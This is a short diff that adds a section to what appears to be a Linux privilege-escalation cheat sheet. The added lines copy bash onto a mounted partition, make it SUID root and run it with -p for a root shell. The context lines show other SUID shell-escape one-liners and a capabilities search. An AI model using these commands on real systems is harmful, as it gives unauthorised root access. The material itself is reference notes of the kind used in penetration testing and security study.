@@ -891,6 +891,16 @@ python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
 env /bin/sh -p
 ```
 
+### Copy SUID binaries to mounted partition
+```bash
+cp /bin/bash /home/<user>/bash
+chmod 4755 /home/<user>/bash
+chown root:root /home/<user>/bash
+
+# Then from host 
+/home/<user>/bash -p
+```
+
 ### Capabilities
 ```bash
 /usr/sbin/getcap -r / 2>/dev/null
